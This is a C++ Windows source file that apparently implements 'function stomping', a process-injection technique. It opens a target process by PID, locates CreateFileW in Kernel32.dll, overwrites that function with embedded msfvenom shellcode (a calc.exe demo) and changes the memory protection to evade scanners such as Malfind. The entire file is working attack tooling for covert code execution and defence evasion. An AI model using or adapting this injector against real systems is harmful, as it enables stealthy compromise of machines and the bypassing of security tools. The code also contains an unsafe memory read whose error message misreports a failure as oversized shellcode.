#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#include <Shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

BYTE* GetFunctionBase(HANDLE procHandle, const wchar_t* moduleName, const char* functionName);

// msfvenom -p windows/x64/exec CMD=calc.exe -a x64 -b "x00" -f c
unsigned char shellcode[] = "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff"
                                        "\xff\xff\x48\xbb\xe6\x83\x8f\x91\xf8\x9d\xda\x8a\x48\x31\x58"
                                        "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x1a\xcb\x0c\x75\x08\x75"
                                        "\x1a\x8a\xe6\x83\xce\xc0\xb9\xcd\x88\xdb\xb0\xcb\xbe\x43\x9d"
                                        "\xd5\x51\xd8\x86\xcb\x04\xc3\xe0\xd5\x51\xd8\xc6\xcb\x04\xe3"
                                        "\xa8\xd5\xd5\x3d\xac\xc9\xc2\xa0\x31\xd5\xeb\x4a\x4a\xbf\xee"
                                        "\xed\xfa\xb1\xfa\xcb\x27\x4a\x82\xd0\xf9\x5c\x38\x67\xb4\xc2"
                                        "\xde\xd9\x73\xcf\xfa\x01\xa4\xbf\xc7\x90\x28\x16\x5a\x02\xe6"
                                        "\x83\x8f\xd9\x7d\x5d\xae\xed\xae\x82\x5f\xc1\x73\xd5\xc2\xce"
                                        "\x6d\xc3\xaf\xd8\xf9\x4d\x39\xdc\xae\x7c\x46\xd0\x73\xa9\x52"
                                        "\xc2\xe7\x55\xc2\xa0\x31\xd5\xeb\x4a\x4a\xc2\x4e\x58\xf5\xdc"
                                        "\xdb\x4b\xde\x63\xfa\x60\xb4\x9e\x96\xae\xee\xc6\xb6\x40\x8d"
                                        "\x45\x82\xce\x6d\xc3\xab\xd8\xf9\x4d\xbc\xcb\x6d\x8f\xc7\xd5"
                                        "\x73\xdd\xc6\xc3\xe7\x53\xce\x1a\xfc\x15\x92\x8b\x36\xc2\xd7"
                                        "\xd0\xa0\xc3\x83\xd0\xa7\xdb\xce\xc8\xb9\xc7\x92\x09\x0a\xa3"
                                        "\xce\xc3\x07\x7d\x82\xcb\xbf\xd9\xc7\x1a\xea\x74\x8d\x75\x19"
                                        "\x7c\xd2\xd9\x42\x9c\xda\x8a\xe6\x83\x8f\x91\xf8\xd5\x57\x07"
                                        "\xe7\x82\x8f\x91\xb9\x27\xeb\x01\x89\x04\x70\x44\x43\x6d\x6f"
                                        "\x28\xb0\xc2\x35\x37\x6d\x20\x47\x75\x33\xcb\x0c\x55\xd0\xa1"
                                        "\xdc\xf6\xec\x03\x74\x71\x8d\x98\x61\xcd\xf5\xf1\xe0\xfb\xf8"
                                        "\xc4\x9b\x03\x3c\x7c\x5a\xf2\x99\xf1\xb9\xa4\x83\xfb\xea\x91"
                                        "\xf8\x9d\xda\x8a";

int FunctionStomping(DWORD pid)
{
    DWORD oldPermissions;
    HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (procHandle == 0 || procHandle == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Could not get process handle: " << GetLastError() << std::endl;
        return -1;
    }
    std::cout << "[+] Got process handle!" << std::endl;

    // Getting the remote module base.
    BYTE* functionBase = GetFunctionBase(procHandle, L"Kernel32.dll", "CreateFileW");

    if (!functionBase) {
        DWORD lastError = GetLastError();

        if (lastError == 126) {
            std::cerr << "[-] The function name is misspelled or the function is unstompable." << std::endl;
        }
        else {
            std::cerr << "[-] Could not get function pointer: " << lastError << std::endl;
        }
        CloseHandle(procHandle);
        return -1;
    }

    std::cout << "[+] Got function base!" << std::endl;

    // Verifying that the shellcode isn't too big.
    SIZE_T sizeToWrite = sizeof(shellcode);
    BYTE* oldFunction;
    
    if (!ReadProcessMemory(procHandle, functionBase, &oldFunction, sizeToWrite, NULL)) {
        std::cerr << "[-] Shellcode is too big!" << std::endl;
        CloseHandle(procHandle);
        return -1;
    }

    // Changing the protection to READWRITE to write the shellcode.
    if (!VirtualProtectEx(procHandle, functionBase, sizeToWrite, PAGE_EXECUTE_READWRITE, &oldPermissions)) {
        std::cerr << "[-] Failed to change protection: " << GetLastError() << std::endl;
        CloseHandle(procHandle);
        return -1;
    }
    std::cout << "[+] Changed protection to RW to write the shellcode." << std::endl;

    SIZE_T written;

    // Writing the shellcode to the remote process.
    if (!WriteProcessMemory(procHandle, functionBase, shellcode, sizeof(shellcode), &written)) {
        std::cerr << "[-] Failed to overwrite function: " << GetLastError() << std::endl;
        VirtualProtectEx(procHandle, functionBase, sizeToWrite, oldPermissions, &oldPermissions);
        CloseHandle(procHandle);
        return -1;
    }
    
    std::cout << "[+] Successfuly stomped the function!" << std::endl;

    // Changing the protection to WCX to evade injection scanners like Malfind: https://www.cyberark.com/resources/threat-research-blog/masking-malicious-memory-artifacts-part-iii-bypassing-defensive-scanners.
    if (!VirtualProtectEx(procHandle, functionBase, sizeToWrite, PAGE_EXECUTE_WRITECOPY, &oldPermissions)) {
        std::cerr << "[-] Failed to change protection: " << GetLastError() << std::endl;
        CloseHandle(procHandle);
        return -1;
    }

    std::cout << "[+] Changed protection to WCX to run the shellcode!\n[+] Shellcode successfuly injected!" << std::endl;

    CloseHandle(procHandle);
    return 0;
}

// Based on: https://github.com/countercept/ModuleStomping/blob/master/injectionUtils/utils.cpp
BYTE* GetFunctionBase(HANDLE procHandle, const wchar_t* moduleName, const char* functionName) {
    BOOL res;
    DWORD moduleListSize;
    BYTE* functionBase = NULL;

    // Getting the size to allocate.
    res = EnumProcessModules(procHandle, NULL, 0, &moduleListSize);

    if (!res) {
        std::cerr << "[-] Failed to get buffer size for EnumProcessModules: " << GetLastError() << std::endl;
        return functionBase;
    }

    // Getting the module list.
    HMODULE* moduleList = (HMODULE*)malloc(moduleListSize);

    if (moduleList == 0) {
        return functionBase;
    }
    memset(moduleList, 0, moduleListSize);
    
    res = EnumProcessModules(procHandle, moduleList, moduleListSize, &moduleListSize);

    if (!res) {
        // Retry this one more time.
        res = EnumProcessModules(procHandle, moduleList, moduleListSize, &moduleListSize);

        if (!res) {
            std::cerr << "[-] Failed to EnumProcessModules: " << GetLastError() << std::endl;
            free(moduleList);
            return functionBase;
        }
    }

    // Iterating the modules of the process.

    for (HMODULE* modulePtr = &moduleList[0]; modulePtr < &moduleList[moduleListSize / sizeof(HMODULE)]; modulePtr++) {
        HMODULE currentModule = *modulePtr;
        wchar_t currentModuleName[MAX_PATH];
        memset(currentModuleName, 0, MAX_PATH);

        // Getting the module name.
        if (GetModuleFileNameEx(procHandle, currentModule, currentModuleName, MAX_PATH - sizeof(wchar_t)) == 0) {
            std::cerr << "[-] Failed to get module name: " << GetLastError() << std::endl;
            continue;
        }

        // Checking if it is the module we seek.
        if (StrStrI(currentModuleName, moduleName) != NULL) {
            
            functionBase = (BYTE*)GetProcAddress(currentModule, functionName);
            break;
        }
    }

    free(moduleList);
    return functionBase;
}
